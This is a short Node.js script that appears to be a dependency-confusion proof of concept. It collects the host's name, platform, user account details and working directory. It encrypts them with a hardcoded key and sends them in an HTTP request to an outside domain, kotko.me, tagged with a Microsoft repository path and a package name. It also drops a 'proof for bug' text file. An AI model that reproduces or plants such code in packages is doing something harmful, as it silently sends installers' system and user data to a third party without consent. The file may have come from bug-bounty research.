var os = require("os");
const request = require('request');
const crypto = require('crypto');
var fs = require('fs');


var hostname = os.hostname();
var type = os.platform();
var userInfo = os.userInfo();
var currentPath = process.cwd();
var json = [];


const algorithm = 'aes-256-ctr';
const secretKey = 'vOVH6sdmpNWjRRIqCc7rdxs01lwHzfr3';
const iv = crypto.randomBytes(16);

json.push(hostname)
json.push(type)
json.push(userInfo)
json.push(currentPath)
json = JSON.stringify(json);
const { encrypt, decrypt } = require('./crypto');

let hash = encrypt(json);


let company = "microsoft/react-native-tscodegen:packages/update-test-files/package.json"
let packages = "tslint-shared"

fs.writeFile('pocByKotko.txt', 'this proof for bug', function (err) {
  if (err) throw err;
});

// var dString = JSON.parse(Buffer.from("eyJpdiI6ImNlM2M2N2IxMWJjN2NhMGQwOTYxMTNlMjM4YzVhNDYzIiwiY29udGVudCI6ImEyY2RhNmJlMmYwNjM1YTk5ZmJmNDU1Mzg5ZmJkMjZjMDUwNjRiMDdlZTJiMjhmNGYzNzAwM2JlNWU0MmY1MGMwZGY4Y2FjNTJhNDQwOTRkNTBiYmZhODA1ZWRmNGMwNGQzYjhkNDBlMmM3MWRhZTI3MTI3NjllMGQxOGZmYWJmM2MzNjg0OWU1ZmVhNjJkODA1MDExY2JjM2QzNjI4MDA1MTRhZGM2YzE2YzAwMjg0Mzg2YjJmZWU0ZGY3MGRjOWUyYTMyNDgyMTdlNzNlZDdkZDQ4ZGUyNGRhOGJlN2RiZWM1YzJlNjBiMjc4NGUwNTA5ZjBhOGYyNGIyZjNjNjVhNGMxNmNhM2ZmZjhiZTZkZDNjMTRmYTRlZmRjMGY3MTM0Y2Y5Zjc2YzEyMjcwNjRiODYzZDRhM2E0ZDc3Mjk5MWJmYTI4YmRiMTMxZjI1ZDQ2NzkwMWM4MDhiMTM1MjUxNmU4ODcwNmQyZGRlY2I5YjE5MDMwYTczOWM1ODNiZmFmMGRmYTIzZWQ3OWJiZDIyMDllZDQxYmZmODI3MDFjNDhlNTQ3MjRjMjU0NGViNzRiZDhmYjcwOTdmOTA2ODc3ZmI2MzQxZDQ3YzE2MTUwNzMwYTRjZTZiYTBmYjEifQ", 'base64'))
//
// console.log(decrypt(dString))

var buff = Buffer.from(JSON.stringify(hash)).toString("base64");
request(`https://kotko.me/?${company}:${packages}=${buff}`, (error, response, body) => {})
